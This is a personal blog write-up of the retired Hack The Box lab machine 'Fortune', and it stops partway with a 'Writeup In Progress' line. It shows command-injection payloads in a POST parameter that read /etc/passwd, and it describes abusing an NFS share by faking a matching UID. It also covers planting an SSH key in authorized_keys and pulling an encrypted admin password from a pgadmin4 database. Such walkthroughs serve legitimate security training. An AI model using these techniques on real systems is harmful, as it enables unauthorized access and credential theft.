### TL;DR 
There might not necessarily be anything "new" in this box if you've done all of the previous ones, but it's my absolute personal favorite. Thank you so much <a href="https://www.hackthebox.eu/home/users/profile/46317">AuxSarge</a> for creating it. I was so sad when it retired! üò¢
<p><br></p>

### Overview

The `Fortune` machine on Hack The Box (created by <a href="https://www.hackthebox.eu/home/users/profile/46317">AuxSarge</a>) is a retired 50 point OpenBSD machine with some pretty interesting parts to it. If you have completed all of the previous boxes on Hack The Box, then `Fortune` should be pretty simple, as there is nothing particularly new introduced.
<p><br></p>

The box starts with simple web enumeration to locate RCE found in the site's `db` variable, which occurs when a semi colon (;) is appended to the end of the `db`. Next, some files are located via the RCE that can be used to create a PKCS12 certificate which permits access to port 443. From there, an SSH key is located to access the user called `nfsuser` and escalate to the user `charlie` by mounting a newly found nfs share and using `su` to access `charlie` with a local user that has the same UID. SSH keys for `charlie` are then used to access the user via SSH and enumerate further.
<p><br></p>

Finally, there is a `pgadmin4` database running on the box which contains hashes for the root password. A file called `crypto.py` is utilized for `pgadmin4's` encoding/decoding process, and can be used here to decode the root password and ultimately grab the flag.
<p><br></p>

### Nmap Scan

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/HTB-FORTUNE# nmap -sC -sV -A -Pn 10.10.10.127

</code></pre></div></div>

So, it appears port `443` is HTTPS (as expected), but it requires an SSL certificate to access it. I'll leave it alone for now because of this. However, port `80` proves to be quite interesting.
<p><br></p>

### Web Enumeration

Here's what I discovered upon navigating to `http://10.10.10.127/` in my browser:

<img src="/assets/img/writeups/HTB-FORTUNE/fortune-homepage.PNG" class="fortune-img" alt="Hack The Box - Fortune Homepage">

Hmm... 

Let's try capturing a request with `Burp Suite`!

```
POST /select HTTP/1.1
Host: 10.10.10.127
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0

db=fortunes
```

The `db` variable looks pretty spicy! üå∂Ô∏è

After running `wfuzz`, I discovered I could append a semi colon (;) to `db` and execute commands on the box, like so:

```
POST /select HTTP/1.1
Host: 10.10.10.127

db=fortunes; id
```

And the response:
```

```

Nice! We have code execution. Let's have a look around to see what else we can find. 
<p><br></p>

### File Enumeration & NFS Share Access

(Shortened output for readability):

```
db=fortunes;cat /etc/passwd

charlie:*:1000:1000:Charlie:/home/charlie:/bin/ksh
bob:*:1001:1001::/home/bob:/bin/ksh
nfsuser:*:1002:1002::/home/nfsuser:/usr/sbin/authpf
```

Well, well, well... It would appear we have three different users here. They are `charlie`, `bob`, and `nfsuser`. Immediately, `nfsuser` appears interesting to me given the naming convention. The username `nfsuser` can easily be attributed to an `nfs share`! Now, this is great and all, but I still don't know how to access these users, nor am I able to add my own `ssh` keys... I was able to `ping` myself at this point, but couldn't manage to get a shell back.
<p><br></p>

However, I did some snooping around and discovered some files in the user `bob`'s home directory (`/home/bob`). There was one cert file (`intermediate.cert.pem`) and one key file (`intermediate.key.pem`), which can be converted to a PKCS12 certificate. I used `openssl` to create the certificate, like so:

```
openssl pkcs12 -export -out fortune.htb.p12 -in intermediate.cert.pem -inkey intermediate.key.pem
```
I was then able to import the certificate with Firefox and access the (now unrestricted) `HTTPS` port, `443`.

This is the prompt I received upon importing my certificate:

<img src="/assets/img/writeups/HTB-FORTUNE/fortune-cert-prompt.PNG" class="fortune-img" alt="Hack The Box - Fortune Homepage">

The `HTTPS` homepage displayed this message upon my first visit:

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>You will need to use the local authpf service to obtain elevated network access. 
If you do not already have the appropriate SSH key pair, then you will need 
to <a href="https://10.10.10.127/generate">generate</a> one and configure your local system appropriately to proceed.
</code></pre></div></div>

I clicked on `generate` and it redirected me to a page that looked like this:

<a href="https://defarbs.com/assets/img/writeups/HTB-FORTUNE/fortune-generate-page.PNG">
  <img src="/assets/img/writeups/HTB-FORTUNE/fortune-generate-page.PNG" class="fortune-img" alt="Hack The Box - Fortune Homepage">
<a>
Note: If the above image is too small, click it to expand!

It looks like an SSH keypair appeared!

<img src="/assets/img/writeups/HTB-FORTUNE/surprised-pikachu.jpg" class="fortune-img" alt="Surprised Pikachu!">

This is great, because it means we can now access a user account! I threw the newly found keypair into respective files (`nfsuser_rsa` and `nfsuser_rsa.pub`). After doing some digging around with the RCE mentioned earlier, I noticed that `authpf` was installed, which is why I thusly associated the keys with the `nfsuser` account. I then tried using the ssh keypair I found at `/generate` to log in via SSH, like so:

```
+[root@kali: keys]$ ssh -i nfsuser_rsa nfsuser@10.10.10.127

Hello nfsuser. You are authenticated from host "10.10.14.34"
```

So, there appears to be some interesting output here. After authenticating via SSH, I ran another nmap scan to see what was *really* happening here. It turns out, logging in via SSH as `nfsuser` allows us to mount the `/home` directory as anyone we want! During prior enumeration, I located two other users: `bob` and `charlie`. I have already accessed `bob's` directory, but have not been able to access `charlie`. 

I ended up managing to mount `/home` locally by running the `mount` command like so:

```
mount -t nfs 10.10.10.127:/home /temp -o nolock
```
I already had the empty `/temp` directory created beforehand. Once the share is mounted, we can check to see what is there:

```
+[root@kali: temp]$ ls -al
total 40
drwxr-xr-x  5 root  root      512 Nov  2  2018 .
drwxr-xr-x 21 root  root    32768 Sep 17 17:15 ..
drwxr-xr-x  5  1001 charlie   512 Nov  3  2018 bob
drwxr-x---  3 farbs farbs     512 Nov  5  2018 charlie
drwxr-xr-x  2  1002    1002   512 Nov  2  2018 nfsuser
```
Cool, all of the directories are outputted. I have created a local user named `farbs` which shares the same UID as `charlie`. Therefore, I can simply enter `su farbs` and access the `charlie` directory since the permissions already match.

```
+[root@kali: temp]$ su farbs
farbs@kali:/temp$ cd charlie
farbs@kali:/temp/charlie$ wc -c user.txt
33 user.txt
```
And... we got `user.txt`!

From here, I went ahead and generated my own ssh keypair and then added my public key to `charlie's` `authorized_keys` file so I could ssh in as `charlie`. 

Once I had my ssh keypair generated, I added it to the `authorized_keys` file:

```
farbs@kali:/temp/charlie/.ssh$ echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCgGP15cHMY8+Mg8aUg5mml5t6jxpY43paksKO84vhdJdaKFQnryShQI2GbzpbNkV0ICl1yJnKdN0DfnLOXcAkt6YLSvOR7tModGaP/0XOCGBWneO7/U4HMnuEX4VcfHoR+AoCjmCNx8diQvO/yytLDmEJic4yYEUz8m2nA7l14AE6t+YtaJO5tzvJ6CSHaOGVrZiGqCGq2tkE9kN5o+Wg77P3Z8Vq72tOsitQ+hUSloLkMFVUKZWQSGsY1s/3G/b6eT4ZyetVU3Nggv+QYAbWfMDbj+imeREz7Z7T/bxy1tjENq1NSrB/5bZlmAuP/KyKDwI3sktNbhi80q+YRE9ELIA44taj+SjKZ6tZZjQUJIxLt7mZteiw7XgLaVveG+YB9WV1ymxt2wfkQ3Ht6cjl+9JYxoHXIdfBmAivh3goFIOFdxxLRt3RAq/DqlQY4/t3WltAu3LCtBTs8746OMh/vEJFyNOtlPiAXV2f3pGPAYsq4hjYLiV6MDNDvD4+lZKs= >> authorized_keys
```

I then unmounted the share and SSH'd in as `charlie`:

```
+[root@kali: writeup_ssh]$ ssh -i id_rsa charlie@10.10.10.127
OpenBSD 6.4 (GENERIC) #349: Thu Oct 11 13:25:13 MDT 2018

Welcome to OpenBSD: The proactively secure Unix-like operating system.
fortune$ whoami
charlie
```

Now that we're in, it's time to do some more enumeration! I notice an `mbox` file sitting in `charlie's` home directory, so I take a look at it. It reads the following:

```
From bob@fortune.htb Sat Nov  3 11:18:51 2018
Return-Path: <bob@fortune.htb>
Delivered-To: charlie@fortune.htb
Received: from localhost (fortune.htb [local])

        Sat, 3 Nov 2018 11:18:51 -0400 (EDT)

Message-ID: <196699abe1fed384@fortune.htb>
Status: RO

Hi Charlie,

Thanks for setting-up pgadmin4 for me. Seems to work great so far.
BTW: I set the dba password to the same as root. I hope you don't mind.

Cheers,

Bob
```
Looks like `Bob` decided to drop us a hint about the `pgadmin4` database! Bob appears to have set the database admin's password to the same thing as the `root` password. With this in mind, I started snooping around to see if I could find the `pgadmin4` database on the box in order to thusly attempt to read its contents.

After a bit of digging, I found that the dba's password to the `PostgreSQL` database actually resides in an `SQLite3` database located at `/var/appsrv/pgadmin4/pgadmin4.db`.

Once I opened the database with `sqlite3`, I ran `.tables` to check what tables existed in the database.

```
sqlite> .tables
alembic_version              roles_users                
debugger_function_arguments  server                     
keys                         servergroup                
module_preference            setting                    
preference_category          user                       
preferences                  user_preferences           
process                      version                    
role 
```

From here, I ended up determining that the `server` table contained the username and password contents for the database administrator:

```
sqlite> select username,password from server;
dba|utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz
```

## Writeup In Progress... Stay tuned!
